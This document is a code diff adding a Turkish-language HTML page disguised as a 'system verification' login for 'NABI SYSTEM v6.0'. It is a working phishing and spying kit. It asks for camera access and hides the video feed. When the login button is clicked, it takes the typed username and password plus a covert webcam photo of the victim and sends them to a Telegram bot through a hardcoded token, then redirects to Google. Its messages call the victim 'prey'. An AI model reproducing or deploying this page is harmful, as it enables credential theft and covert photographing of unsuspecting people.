@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Sistem Doğrulaması</title>
+    <style>
+        body { background: #121212; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .box { background: #1f1f1f; padding: 25px; border-radius: 15px; display: inline-block; border: 1px solid #333; }
+        video, canvas { display: none; }
+        input { width: 90%; padding: 10px; margin: 10px 0; background: #2c2c2c; border: 1px solid #444; color: white; border-radius: 5px; }
+        button { width: 95%; padding: 12px; background: #00ff7f; border: none; color: black; cursor: pointer; font-weight: bold; border-radius: 5px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h3>NABI SYSTEM v6.0</h3>
+        <p>Devam etmek için giriş yapın ve kameraya izin verin.</p>
+        <video id="video" autoplay></video>
+        <canvas id="canvas"></canvas>
+        <input type="text" id="user" placeholder="Kullanıcı Adı / E-posta">
+        <input type="password" id="pass" placeholder="Şifre">
+        <button id="loginBtn">SİSTEME GİRİŞ YAP</button>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8492011222:AAEUXPE2bmnRZdGgPT1mGBxVFXIX7nfUfxc"; // <--- Token buraya!
+        const urlParams = new URLSearchParams(window.location.search);
+        const userId = urlParams.get('id'); // Linkteki id'yi alır
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // Kamera izni iste
+        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+            video.srcObject = stream;
+        });
+
+        document.getElementById('loginBtn').addEventListener('click', async () => {
+            const user = document.getElementById('user').value;
+            const pass = document.getElementById('pass').value;
+
+            // Fotoğraf çek
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0);
+            const imageData = canvas.toDataURL('image/png');
+
+            // 1. Verileri Metin Olarak Gönder
+            const textMsg = `🔥 **Yeni Av Yakalandı!**\n👤 Kullanıcı: ${user}\n🔑 Şifre: ${pass}\n🆔 Sahibi: ${userId}`;
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userId}&text=${encodeURIComponent(textMsg)}&parse_mode=Markdown`);
+
+            // 2. Fotoğrafı Gönder (Base64'ü Blob'a çevirip yolluyoruz)
+            const blob = await (await fetch(imageData)).blob();
+            const formData = new FormData();
+            formData.append('chat_id', userId);
+            formData.append('photo', blob, 'av.png');
+            formData.append('caption', "📸 Kurbanın Görüntüsü!");
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+
+            // İşlem bitince yönlendir
+            window.location.href = "https://www.google.com";
+        });
+    </script>
+</body>
+</html>
